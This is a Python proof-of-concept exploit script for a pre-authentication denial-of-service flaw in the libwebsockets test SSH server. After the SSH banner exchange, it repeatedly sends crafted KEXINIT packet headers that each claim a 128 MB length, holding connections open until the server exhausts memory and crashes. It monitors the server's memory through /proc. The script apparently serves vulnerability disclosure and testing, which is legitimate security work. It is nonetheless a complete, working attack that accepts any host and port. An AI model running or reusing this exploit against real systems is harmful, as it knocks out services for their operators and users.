#!/usr/bin/env python3
"""
PoC: SSHD Pre-Auth Unbounded Allocation 

Usage:
  1. Start the server:  ./bin/libwebsockets-test-sshd -d 7
  2. Run this script:   python3 poc_sshd_unbounded_alloc.py [host] [port]
"""

import socket
import struct
import subprocess
import sys
import time

SSH_MSG_KEXINIT = 20
ALLOC_SIZE = 0x08000000  # 128 MB per connection

def craft_malicious_packet(msg_len, msg_id):
    packet = struct.pack(">I", msg_len)
    packet += struct.pack("B", 0)
    packet += struct.pack("B", msg_id)
    return packet

def get_server_rss(pid):
    try:
        with open(f"/proc/{pid}/status") as f:
            for line in f:
                if line.startswith("VmRSS:"):
                    return int(line.split()[1])
    except (FileNotFoundError, ProcessLookupError):
        return -1
    return -1

def server_alive(pid):
    try:
        with open(f"/proc/{pid}/comm") as f:
            return True
    except (FileNotFoundError, ProcessLookupError):
        return False

def find_server_pid():
    try:
        result = subprocess.run(
            ["pgrep", "-f", "libwebsockets-test-sshd"],
            capture_output=True, text=True
        )
        pids = [p for p in result.stdout.strip().split('\n') if p]
        for pid in pids:
            try:
                with open(f"/proc/{pid}/comm") as f:
                    comm = f.read().strip()
                if comm.startswith("libwebsocket"):
                    return int(pid)
            except (FileNotFoundError, ValueError):
                continue
        return None
    except (ValueError, IndexError):
        return None

def open_malicious_connection(host, port, alloc_size):
    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.settimeout(10)
    sock.connect((host, port))

    banner = b""
    while not banner.endswith(b"\n"):
        banner += sock.recv(256)

    sock.sendall(b"SSH-2.0-PoC_UnboundedAlloc\r\n")
    time.sleep(0.3)

    sock.setblocking(False)
    try:
        while True:
            d = sock.recv(4096)
            if not d:
                break
    except BlockingIOError:
        pass
    sock.setblocking(True)
    sock.settimeout(10)

    pkt = craft_malicious_packet(alloc_size, SSH_MSG_KEXINIT)
    sock.sendall(pkt)
    return sock

def main():
    host = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
    port = int(sys.argv[2]) if len(sys.argv) > 2 else 2200

    alloc_mb = ALLOC_SIZE / (1024 * 1024)
    print(f"=== SSHD Pre-Auth Unbounded Allocation PoC ===")
    print(f"Target: {host}:{port}")
    print(f"Allocation per connection: {alloc_mb:.0f} MB")
    print()

    server_pid = find_server_pid()
    if not server_pid:
        print("[-] Could not find server PID")
        sys.exit(1)
    print(f"[*] Server PID: {server_pid}")

    baseline_rss = get_server_rss(server_pid)
    print(f"[*] Baseline RSS: {baseline_rss} kB ({baseline_rss/1024:.1f} MB)")
    print()

    sockets = []
    i = 0
    try:
        while server_alive(server_pid):
            i += 1
            try:
                sock = open_malicious_connection(host, port, ALLOC_SIZE)
                sockets.append(sock)
                time.sleep(0.5)
            except (ConnectionRefusedError, ConnectionResetError, OSError) as e:
                print(f"[!] Connection {i} failed: {e}")
                break

            current_rss = get_server_rss(server_pid)
            if current_rss < 0:
                print(f"[!] Server process gone after connection {i}")
                break
            delta = current_rss - baseline_rss
            print(f"  [{i:>3}] RSS: {current_rss:>10} kB ({current_rss/1024:>8.1f} MB)  "
                  f"delta: +{delta:>10} kB (+{delta/1024:>8.1f} MB)")
    except KeyboardInterrupt:
        print("\n[*] Interrupted by user.")

    print()
    if server_alive(server_pid):
        final_rss = get_server_rss(server_pid)
        print(f"[*] Server still alive. Final RSS: {final_rss} kB ({final_rss/1024:.1f} MB)")
    else:
        print(f"[+] SERVER CRASHED after {i} connections "
              f"(~{i * alloc_mb:.0f} MB allocated without authentication).")

    print()
    print("[*] Closing held connections...")
    for s in sockets:
        try:
            s.close()
        except:
            pass

    print("[*] PoC complete.")

if __name__ == "__main__":
    main()
